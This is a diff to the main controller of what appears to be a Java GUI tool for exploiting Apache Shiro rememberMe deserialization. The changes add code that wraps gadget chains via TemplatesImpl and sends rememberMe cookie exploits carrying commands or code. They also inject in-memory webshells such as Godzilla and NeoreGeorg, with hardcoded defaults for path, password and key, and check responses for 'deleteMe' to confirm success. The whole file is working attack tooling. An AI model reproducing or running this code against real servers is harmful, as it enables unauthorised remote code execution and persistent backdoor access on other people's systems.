@@ -20,6 +20,7 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 import java.util.ResourceBundle;
 import java.util.prefs.Preferences;
@@ -190,8 +191,6 @@ public class MainController {
     @FXML
     private Label changeKeyTargetLabel;
     @FXML
-    private Button clearChangeKeyHistoryBtn;
-    @FXML
     private Hyperlink githubLink;
     @FXML
     private Label footerByLabel;
@@ -206,6 +205,12 @@ public class MainController {
     private TextField shellPathText;
     @FXML
     private TextField shellPassText;
+    @FXML
+    private TextField jmgPassText;
+    @FXML
+    private TextField jmgPathText;
+    @FXML
+    private TextField jmgKeyText;
     @FXML
     private Button injectShellBtn;
     @FXML
@@ -257,8 +262,6 @@ public class MainController {
     @FXML
     private ComboBox<String> jmgFormatOpt;
     @FXML
-    private ComboBox<String> jmgGadgetOpt;
-    @FXML
     private Button genMemshellBtn;
     @FXML
     private Label memshellShiroChainHintLabel;
@@ -279,6 +282,10 @@ public class MainController {
     private String lastEchoExploitEcho;
     /** 最近一次回显生成时填写的命令 */
     private String lastEchoExploitCmd;
+    /** 最近一次回显生成时的模型类型（MODEL_CMD / MODEL_CODE） */
+    private String lastEchoExploitModelType;
+    /** 最近一次 jEG MODEL_CODE 生成时的代码参数名（jEG setReqParamName） */
+    private String lastEchoExploitCodeParamName;
     /** 最近一次成功生成的内存马字节码串（Base64 等） */
     private String lastMemshellExploitPayload;
     /** 最近一次内存马生成来源：Legacy / jMG（Shiro 注入时与主界面注入共用 POST 流程） */
@@ -439,8 +446,8 @@ public class MainController {
         }
         if (this.memshellShiroChainHintLabel != null) {
             this.memshellShiroChainHintLabel.setText(zh
-                    ? "「Shiro 注入」与「内存马注入」相同：InjectMemTool 的 rememberMe + POST user=Base64（jMG/传统一致）。表格 Gadget 为 jMG 内部选项，与 Shiro 链无关。"
-                    : "Shiro inject matches Memshell tab: InjectMe rememberMe cookie + POST user=Base64 (jMG/Legacy). Grid Gadget is jMG-only, not the Shiro chain.");
+                    ? "jMG 走 TemplatesImpl 封装路径（GADGET_JDK_TRANSLET），传统模式走 InjectMemTool"
+                    : "jMG uses TemplatesImpl wrapper (GADGET_JDK_TRANSLET), Legacy uses InjectMemTool");
         }
         if (this.sendMemshellShiroInjectBtn != null) {
             this.sendMemshellShiroInjectBtn.setText(zh ? "Shiro 注入" : "Shiro Inject");
@@ -454,7 +461,6 @@ public class MainController {
         if (this.changeKeyHintLabel != null) this.changeKeyHintLabel.setText(zh ? "先完成密钥和利用链检测，再执行本页。" : "Finish key and gadget detection before using this tab.");
         if (this.changeKeyMethodLabel != null) this.changeKeyMethodLabel.setText(zh ? "方式" : "Mode");
         if (this.changeKeyTargetLabel != null) this.changeKeyTargetLabel.setText(zh ? "目标 Key" : "Target Key");
-        if (this.clearChangeKeyHistoryBtn != null) this.clearChangeKeyHistoryBtn.setText(zh ? "清空历史" : "Clear History");
         if (this.injectChangeKeyBtn != null) this.injectChangeKeyBtn.setText(zh ? "执行" : "Apply");
         if (this.keygen != null) this.keygen.setText(zh ? "生成 Key" : "Generate Key");
         if (this.footerByLabel != null) this.footerByLabel.setText("BY SummerSec");
@@ -592,19 +598,6 @@ public class MainController {
                 this.logTextArea.appendText(Utils.log("请输入指定密钥"));
             }
         }
-    }
-
-    @FXML
-    void clearChangeKeyHistoryBtn(ActionEvent event) {
-        Preferences p = Preferences.userRoot().node(PREF_NODE_CHANGE_KEY);
-        p.remove(PREF_CHANGE_KEY_HISTORY);
-        if (this.changeKeyNewKeyCombo != null) {
-            this.changeKeyNewKeyCombo.setItems(FXCollections.observableArrayList(new String[]{DEFAULT_CHANGE_KEY}));
-            this.changeKeyNewKeyCombo.getEditor().setText(DEFAULT_CHANGE_KEY);
-            this.changeKeyNewKeyCombo.getSelectionModel().clearSelection();
-        }
-        this.changeKeyOutputArea.appendText(Utils.log("[历史] 已清空修改 Key 历史记录"));
-        AppLogger.info("已清空修改 Shiro Key 历史记录");
     }
 
     @FXML
@@ -810,10 +803,11 @@ public class MainController {
         this.jmgShellOpt.setValue("SHELL_LISTENER");
         this.jmgFormatOpt.setItems(FXCollections.observableArrayList(new String[]{"FORMAT_BASE64", "FORMAT_BCEL", "FORMAT_BIGINTEGER", "FORMAT_CLASS", "FORMAT_JAR", "FORMAT_JAR_AGENT", "FORMAT_JS", "FORMAT_JSP"}));
         this.jmgFormatOpt.setValue("FORMAT_BASE64");
-        this.jmgGadgetOpt.setItems(FXCollections.observableArrayList(new String[]{"GADGET_NONE"}));
-        this.jmgGadgetOpt.setValue("GADGET_NONE");
         this.jmgServerOpt.valueProperty().addListener((obs, oldVal, newVal) -> this.adjustJmgShellForServer(newVal));
         this.adjustJmgShellForServer(this.jmgServerOpt.getValue());
+        this.jmgPassText.setText("pass1024");
+        this.jmgPathText.setText("/favicondemo.ico");
+        this.jmgKeyText.setText("3c6e0b8a9c15224a");
 
         this.changeKeyVariantOpt.setItems(FXCollections.observableArrayList(
                 "filterConfigs -> shiroFilterFactoryBean",
@@ -1626,6 +1620,8 @@ public class MainController {
             this.lastEchoExploitGadget = this.gadgetOpt != null ? this.gadgetOpt.getValue() : null;
             this.lastEchoExploitEcho = this.echoOpt != null ? this.echoOpt.getValue() : null;
             this.lastEchoExploitCmd = this.jegCmdInput != null ? this.jegCmdInput.getText() : null;
+            this.lastEchoExploitModelType = this.jegModelOpt != null ? this.jegModelOpt.getValue() : null;
+            this.lastEchoExploitCodeParamName = this.jegCodeInput != null ? this.jegCodeInput.getText() : null;
             this.syncAttackServiceForEchoExploit(this.lastEchoExploitPayload, this.lastEchoExploitRequestHeaderName, this.lastEchoExploitGadget);
             this.echoGeneratorOutput.appendText("[缓存] 已记录回显载荷上下文，gadget=" + String.valueOf(this.lastEchoExploitGadget)
                     + ", echo=" + String.valueOf(this.lastEchoExploitEcho) + "\n");
@@ -1691,13 +1687,22 @@ public class MainController {
             this.echoGeneratorOutput.appendText("[警告] 当前检测链与缓存载荷链不一致；发送时将优先使用当前检测链。\n");
         }
         if (fromJeg && coerced != null) {
-            this.echoGeneratorOutput.appendText("[发送] jEG：Cookie=rememberMe + Authorization\n");
+            boolean isCode = "MODEL_CODE".equals(this.lastEchoExploitModelType);
+            this.echoGeneratorOutput.appendText("[发送] jEG：" + (isCode ? "Cookie=rememberMe + 代码参数" : "Cookie=rememberMe + Authorization") + "\n");
             this.lastEchoExploitPayload = coerced;
             this.syncAttackServiceForEchoExploit(coerced, null, AttackService.gadget);
-            String cmd = this.lastEchoExploitCmd != null && !this.lastEchoExploitCmd.trim().isEmpty() ? this.lastEchoExploitCmd.trim() : null;
-            String result = cmd != null
-                    ? this.attackService.sendRememberMeCookieExploitWithCmd(coerced, cmd, true, this.echoGeneratorOutput)
-                    : this.attackService.sendRememberMeCookieExploit(coerced, this.echoGeneratorOutput);
+            String result;
+            if (isCode) {
+                String code = this.lastEchoExploitCodeParamName != null && !this.lastEchoExploitCodeParamName.trim().isEmpty()
+                        ? this.lastEchoExploitCodeParamName.trim() : null;
+                String codeParam = this.jegCodeInput != null ? this.jegCodeInput.getText() : null;
+                result = this.attackService.sendRememberMeCookieExploitWithCode(coerced, code, codeParam, this.echoGeneratorOutput);
+            } else {
+                String cmd = this.lastEchoExploitCmd != null && !this.lastEchoExploitCmd.trim().isEmpty() ? this.lastEchoExploitCmd.trim() : null;
+                result = cmd != null
+                        ? this.attackService.sendRememberMeCookieExploitWithCmd(coerced, cmd, true, this.echoGeneratorOutput)
+                        : this.attackService.sendRememberMeCookieExploit(coerced, this.echoGeneratorOutput);
+            }
             if (result != null) {
                 this.echoGeneratorOutput.appendText("[发送结果] HTTP 已返回，长度=" + result.length() + "\n");
                 this.echoGeneratorOutput.appendText("[发送结果] " + this.attackService.classifyHttpResponse(result) + "\n");
@@ -1751,7 +1756,7 @@ public class MainController {
             this.initAttack();
         }
         String selectedSource = this.memshellSourceOpt.getValue();
-        AppLogger.info("内存马生成: source=" + selectedSource + ", server=" + this.jmgServerOpt.getValue() + ", tool=" + this.jmgToolOpt.getValue() + ", shell=" + this.jmgShellOpt.getValue() + ", format=" + this.jmgFormatOpt.getValue() + ", gadget=" + this.jmgGadgetOpt.getValue());
+        AppLogger.info("内存马生成: source=" + selectedSource + ", server=" + this.jmgServerOpt.getValue() + ", tool=" + this.jmgToolOpt.getValue() + ", shell=" + this.jmgShellOpt.getValue() + ", format=" + this.jmgFormatOpt.getValue());
         if (selectedSource == null || selectedSource.trim().isEmpty()) {
             selectedSource = "传统模式";
             this.memshellSourceOpt.setValue("传统模式");
@@ -1765,14 +1770,20 @@ public class MainController {
         }
         MemshellGenerateResult result;
         try {
+            String pass = this.jmgPassText != null ? this.jmgPassText.getText() : "";
+            String path = this.jmgPathText != null ? this.jmgPathText.getText() : "";
+            String key = this.jmgKeyText != null ? this.jmgKeyText.getText() : "";
             result = this.attackService.generateMemshellWithThirdParty(
                     source,
                     this.jmgToolOpt.getValue(),
                     selectedServer,
                     selectedShell,
                     this.jmgFormatOpt.getValue(),
-                    this.jmgGadgetOpt.getValue(),
-                    this.memShellOpt.getValue()
+                    "GADGET_NONE",
+                    this.memShellOpt.getValue(),
+                    pass,
+                    path,
+                    key
             );
         } catch (Exception ex) {
             this.memshellGeneratorOutput.appendText("[Memshell] exception: " + ex.getMessage() + "\n");
@@ -1791,7 +1802,12 @@ public class MainController {
         }
         this.memshellGeneratorOutput.appendText("[" + resultTitle + "] " + (result.isSuccess() ? "success" : "failed") + "\n");
         if (result.getPayload() != null) {
-            this.memshellGeneratorOutput.appendText(result.getPayload() + "\n");
+            String p = result.getPayload().trim();
+            if (p.length() > 120) {
+                this.memshellGeneratorOutput.appendText(p.substring(0, 60) + " ... " + p.substring(p.length() - 60) + "\n");
+            } else {
+                this.memshellGeneratorOutput.appendText(p + "\n");
+            }
         }
         if (result.getBasicInfo() != null && !result.getBasicInfo().isEmpty()) {
             this.memshellGeneratorOutput.appendText(result.getBasicInfo() + "\n");
@@ -1866,16 +1882,61 @@ public class MainController {
                     "请在「指定Key」填写 Base64 key，或先爆破密钥成功。");
             return;
         }
-        this.memshellGeneratorOutput.appendText("[发送] 与「内存马注入」相同流程：InjectMemTool rememberMe Cookie + POST user=生成载荷 Base64\n");
-        String pass = this.shellPassText != null ? this.shellPassText.getText() : "";
-        String path = this.shellPathText != null ? this.shellPathText.getText() : "";
-        String memLabel;
-        if (this.lastMemshellExploitSource != null && "jMG".equalsIgnoreCase(this.lastMemshellExploitSource.trim())) {
-            memLabel = "jMG " + String.valueOf(this.jmgToolOpt != null ? this.jmgToolOpt.getValue() : "")
-                    + "/" + String.valueOf(this.jmgShellOpt != null ? this.jmgShellOpt.getValue() : "");
+        String pass = this.jmgPassText != null ? this.jmgPassText.getText() : "";
+        String path = this.jmgPathText != null ? this.jmgPathText.getText() : "";
+        boolean isJmg = this.lastMemshellExploitSource != null && "jMG".equalsIgnoreCase(this.lastMemshellExploitSource.trim());
+        String memLabel = isJmg
+                ? "jMG " + String.valueOf(this.jmgToolOpt != null ? this.jmgToolOpt.getValue() : "")
+                    + "/" + String.valueOf(this.jmgShellOpt != null ? this.jmgShellOpt.getValue() : "")
+                : (this.memShellOpt != null ? this.memShellOpt.getValue() : "传统模式内存马");
+
+        String rawPayload = this.lastMemshellExploitPayload.trim();
+        if (isJmg && rawPayload.startsWith("yv66vg")) {
+            this.memshellGeneratorOutput.appendText("[发送] jMG：走 TemplatesImpl 封装路径\n");
+            String rememberMe = this.attackService.wrapClassBytesAsRememberMe(rawPayload, AttackService.gadget, key.trim());
+            if (rememberMe != null && !rememberMe.isEmpty()) {
+                AppLogger.info("内存马 jMG Shiro 注入: gadget=" + AttackService.gadget + ", path=" + path + ", label=" + memLabel);
+                String result = this.attackService.sendRememberMeCookieExploit(rememberMe, this.memshellGeneratorOutput);
+                if (result != null && !result.toLowerCase(Locale.ROOT).contains("deleteme")) {
+                    String httpAddress = Utils.UrlToDomain(this.attackService.url);
+                    String effectivePath = (path != null && !path.isEmpty()) ? path : "/favicondemo.ico";
+                    String effectivePass = (pass != null && !pass.isEmpty()) ? pass : "pass1024";
+                    String effectiveKey = (this.jmgKeyText != null && this.jmgKeyText.getText() != null && !this.jmgKeyText.getText().trim().isEmpty())
+                            ? this.jmgKeyText.getText().trim() : "3c6e0b8a9c15224a";
+                    this.memshellGeneratorOutput.appendText("[注入结果] 载荷已发送，检查响应未检测到 deleteMe\n");
+                    this.memshellGeneratorOutput.appendText("[类型] " + memLabel + "\n");
+                    this.memshellGeneratorOutput.appendText("[路径] " + httpAddress + effectivePath + "\n");
+                    if (memLabel.toUpperCase(Locale.ROOT).contains("GODZILLA")) {
+                        this.memshellGeneratorOutput.appendText("[密码] " + effectivePass + "\n");
+                        this.memshellGeneratorOutput.appendText("[密钥] " + effectiveKey + "\n");
+                        this.memshellGeneratorOutput.appendText("[加密方式] AES\n");
+                    } else {
+                        this.memshellGeneratorOutput.appendText("[密码] " + effectivePass + "\n");
+                        this.memshellGeneratorOutput.appendText("[密钥] " + effectiveKey + "\n");
+                    }
+                    if (memLabel.toUpperCase(Locale.ROOT).contains("NEOREGEORG")) {
+                        this.memshellGeneratorOutput.appendText("[提示] NeoreGeorg 使用自定义 Base64 字母表\n");
+                    }
+                } else if (result != null) {
+                    this.memshellGeneratorOutput.appendText("[注入结果] 失败 — 响应含 deleteMe，Gadget 链反序列化失败\n");
+                    this.memshellGeneratorOutput.appendText("[提示] 请重新「检测当前利用链」或「爆破利用链」确认可用链\n");
+                } else {
+                    this.memshellGeneratorOutput.appendText("[注入结果] 未收到有效响应\n");
+                }
+            } else {
+                this.memshellGeneratorOutput.appendText("[!] jMG TemplatesImpl 封装失败，回退 InjectMemTool 路径\n");
+                fallbackInjectMemTool(key, pass, path, memLabel);
+            }
+        } else if (isJmg) {
+            this.memshellGeneratorOutput.appendText("[!] jMG payload 非 yv66vg 格式，回退 InjectMemTool 路径\n");
+            fallbackInjectMemTool(key, pass, path, memLabel);
         } else {
-            memLabel = this.memShellOpt != null ? this.memShellOpt.getValue() : "传统模式内存马";
+            fallbackInjectMemTool(key, pass, path, memLabel);
         }
+    }
+
+    private void fallbackInjectMemTool(String key, String pass, String path, String memLabel) {
+        this.memshellGeneratorOutput.appendText("[发送] 传统模式：InjectMemTool rememberMe Cookie + POST user=载荷\n");
         AppLogger.info("内存马 Shiro 注入: gadget=" + AttackService.gadget + ", path=" + path + ", label=" + memLabel);
         String result = this.attackService.sendInjectMemToolExploit(
                 AttackService.gadget,
